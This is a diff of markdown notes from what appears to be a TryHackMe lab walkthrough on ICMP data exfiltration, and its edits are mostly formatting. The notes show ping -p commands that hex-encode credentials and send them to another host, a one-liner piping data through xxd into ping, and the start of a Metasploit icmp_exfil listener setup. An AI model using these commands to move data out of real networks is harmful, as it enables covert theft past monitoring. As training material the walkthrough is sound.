@@ -21,10 +21,10 @@ Note that the Data field is optional and could either be empty or it could conta
 
 To perform manual ICMP data exfiltration, we need to discuss the **`ping`** command a bit more. The **`ping`** command is a network administrator software available in any operating system. It is used to check the reachability and availability by sending **`ICMP`** packets, which can be used as follows:
 <br>
-``bash
+```bash
 #Sending one ICMP packet using the PING Command:
 thm@AttackBox$ ping 10.10.144.103 -c 1
-``
+```
 <br>
 We choose to send one ICMP packet from Host 1, our AttackBox, to Host 2, the target machine, using the **`-c 1`** argument from the previous command. Now let's examine the ICMP packet in Wireshark and see what the Data section looks like:
 <br>
@@ -36,7 +36,7 @@ The Wireshark screenshot shows that the Data section has been selected with rand
 The ping command in the Linux OS has an interesting ICMP option. With the -p argument, we can specify 16 bytes of data in hex representation to send through the packet. **Note that the **`-p`** option is only available for Linux operating systems**. We can confirm that by checking the ping's help manual page.
 <br><br>
 ![image](https://github.com/user-attachments/assets/21cd4be2-a81f-4793-b0f9-13489c271214) 
-###### Ping's -p argument
+###### Ping's -p argument Screenshot
 
 Let's say that we need to exfiltrate the following credentials **`thm:tryhackme`**. First, we need to convert it to its Hex representation and then pass it to the **`ping`** command using **`-p`** options as follows,
 
@@ -53,24 +53,27 @@ root@AttackBox$ ping 10.10.144.103 -c 1 -p 74686d3a7472796861636b6d650a
 ```
 
 ##### **or for a one-liner:**
-```bash
+``bash
 ping -c 1 192.198.1.5 -p $(echo -n "test" | xxd -p)
-```
+``
 <br>
 We sent one ICMP packet using the ping command with **`thm:tryhackme`** Data. Let's look at the Data section for this packet in the Wireshark.
 
 ![image](https://github.com/user-attachments/assets/31800a6e-1ce0-4b93-b8b2-b87be4c2cd94)
-#### Checking Data Field in Wireshark
+#### Checking Data Field in Wireshark Screenshot
 <br>
 Excellent! We have successfully filled the ICMP's Data section with our data and manually sent it over the network using the **`ping`** command.
 
-### ICMP Data Exfiltration
+<br>
+## ICMP Data Exfiltration
 
-Now that we have the basic fundamentals of manually sending data over ICMP packets, let's discuss how to use Metasploit to exfiltrate data. The Metasploit framework uses the same technique explained in the previous section. However, it will capture incoming ICMP packets and wait for a Beginning of File (BOF) trigger value. Once it is received, it writes to the disk until it gets an End of File (EOF) trigger value. The following diagram shows the required steps for the Metasploit framework. Since we need the Metasploit Framework for this technique, then we need the AttackBox machine to perform this attack successfully.
+Now that we have the basic fundamentals of manually sending data over ICMP packets, let's discuss how to use Metasploit to exfiltrate data. The Metasploit framework uses the same technique explained in the previous section. However, it will capture incoming ICMP packets and wait for a **`Beginning of File (BOF)`** trigger value. Once it is received, it writes to the disk until it gets an **`End of File (EOF)`** trigger value. The following diagram shows the required steps for the **Metasploit** framework. Since we need the Metasploit Framework for this technique, then we need the AttackBox machine to perform this attack successfully.
 
-ICMP Data Exfiltration
+![image](https://github.com/user-attachments/assets/84f53917-1a90-4917-8f9c-913263876bd5)
+#### ICMP Data Exfiltration Diagram
 
-Now from the AttackBox, let's set up the Metasploit framework by selecting the icmp_exfil module to make it ready to capture and listen for ICMP traffic. One of the requirements for this module is to set the BPF_FILTER option, which is based on TCPDUMP rules, to capture only ICMP packets and ignore any ICMP packets that have the source IP of the attacking machine as follows,
+<br>
+Now from the AttackBox, let's set up the Metasploit framework by selecting the **`<red>icmp_exfil</red>`** module to make it ready to capture and listen for ICMP traffic. One of the requirements for this module is to set the **`BPF_FILTER`** option, which is based on TCPDUMP rules, to capture only ICMP packets and ignore any ICMP packets that have the source IP of the attacking machine as follows,
 
 Set the BPF_FILTER in MSF 
 msf5 > use auxiliary/server/icmp_exfil
